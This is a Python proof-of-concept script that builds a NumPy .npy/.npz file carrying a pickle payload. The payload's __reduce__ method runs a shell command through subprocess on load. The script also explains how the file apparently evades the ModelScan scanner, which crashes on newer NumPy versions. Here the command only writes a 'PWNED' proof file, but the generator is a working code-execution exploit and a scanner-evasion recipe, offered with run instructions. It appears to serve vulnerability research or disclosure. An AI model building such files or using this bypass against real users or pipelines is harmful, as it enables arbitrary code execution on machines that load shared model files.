#!/usr/bin/env python3
"""
Create a malicious .npy file with pickle payload that bypasses ModelScan.
The payload creates a file as proof of execution.
"""
import numpy as np
import pickle
import os
import subprocess
import sys

class MaliciousPayload:
    def __reduce__(self):
        # Create a file to prove code execution
        # Using echo instead of touch for cross-platform compatibility
        if os.name == 'posix':
            cmd = ['sh', '-c', 'echo "PWNED by NumPy bypass $(date)" > /tmp/numpy_bypass_pwned.txt']
        else:
            # Windows fallback
            cmd = ['cmd', '/c', 'echo PWNED by NumPy bypass > %TEMP%\\numpy_bypass_pwned.txt']
        
        return (subprocess.run, (cmd,), {'capture_output': True, 'text': True})

def create_malicious_npy(filename="malicious_model.npy"):
    """Create a .npy file with pickle payload."""
    print(f"[*] Creating malicious .npy file: {filename}")
    
    # CORRECT: Store the object itself, not pickled bytes
    # NumPy will pickle it automatically during save
    malicious_object = MaliciousPayload()
    
    # Create array with the object (not pickled bytes)
    malicious_array = np.array([malicious_object], dtype=object)
    
    # Save as .npy file with allow_pickle=True
    np.save(filename, malicious_array, allow_pickle=True)
    print(f"[+] Saved to {filename}")
    
    # Also save as .npz for alternative testing
    np.savez("malicious_model.npz", data=malicious_array)
    print(f"[+] Also saved to malicious_model.npz")
    
    return filename

def verify_file(filename="malicious_model.npy"):
    """Verify the .npy file loads and executes payload."""
    print(f"\n[*] Verifying {filename} loads with np.load...")
    
    # Check if proof file exists before loading
    proof_file = "/tmp/numpy_bypass_pwned.txt"
    if os.path.exists(proof_file):
        print(f"[!] Warning: Proof file already exists: {proof_file}")
        print("    Removing it to verify fresh execution...")
        os.remove(proof_file)
    
    try:
        # Load with allow_pickle=True to trigger unpickling
        data = np.load(filename, allow_pickle=True)
        print(f"[+] File loaded successfully with np.load(allow_pickle=True)")
        print(f"    Shape: {data.shape}, dtype: {data.dtype}")
        
        # Access the element to trigger unpickling (if not already done)
        if len(data) > 0:
            element = data[0]
            print(f"    First element type: {type(element)}")
            
            # Check if payload executed
            if os.path.exists(proof_file):
                print(f"[✓] SUCCESS: Payload executed! File created: {proof_file}")
                with open(proof_file, 'r') as f:
                    print(f"    Content: {f.read().strip()}")
            else:
                print(f"[-] Payload may not have executed. Proof file not found.")
                
    except Exception as e:
        print(f"[-] Error loading file: {e}")
        import traceback
        traceback.print_exc()

def test_bypass_mechanism():
    """Test why ModelScan fails to scan this file."""
    print("\n" + "=" * 60)
    print("BY PASS ANALYSIS:")
    print("=" * 60)
    
    try:
        import numpy as np
        version = np.__version__
        print(f"[*] NumPy version: {version}")
        
        # Check if the internal functions exist
        try:
            from numpy.lib.format import _check_version
            print("[!] _check_version EXISTS (old NumPy)")
        except ImportError:
            print("[✓] _check_version MISSING (NumPy >=2.3.5)")
            
        try:
            from numpy.lib.format import _read_array_header
            print("[!] _read_array_header EXISTS (old NumPy)")
        except ImportError:
            print("[✓] _read_array_header MISSING (NumPy >=2.3.5)")
            
        print("\n[*] ModelScan's scan_numpy function calls:")
        print("    np.lib.format._check_version(version)")
        print("    np.lib.format._read_array_header(stream, version)")
        print("\n[*] With NumPy >=2.3.5:")
        print("    → AttributeError → scanner crashes")
        print("    → Returns SCAN_NOT_SUPPORTED or error")
        print("    → File bypasses detection")
        
    except ImportError:
        print("[-] NumPy not installed")

if __name__ == "__main__":
    print("=" * 60)
    print("NumPy ModelScan Bypass - Malicious .npy Generator")
    print("=" * 60)
    
    # Create malicious file
    npy_file = create_malicious_npy()
    
    # Verify it works and executes payload
    verify_file(npy_file)
    
    # Analyze bypass mechanism
    test_bypass_mechanism()
    
    print("\n" + "=" * 60)
    print("EXPLOIT SUMMARY:")
    print("=" * 60)
    print("1. Created malicious_model.npy with MaliciousPayload object")
    print("2. np.save() pickles the object automatically")
    print("3. np.load(allow_pickle=True) unpickles → __reduce__ executes")
    print("4. Creates file /tmp/numpy_bypass_pwned.txt as proof")
    print("5. ModelScan fails to scan due to missing _check_version()")
    print("6. Result: File bypasses security scanning")
    print("\nTo test the exploit:")
    print("  $ python3 -c \"import numpy as np; np.load('malicious_model.npy', allow_pickle=True)\"")
    print("  $ cat /tmp/numpy_bypass_pwned.txt")
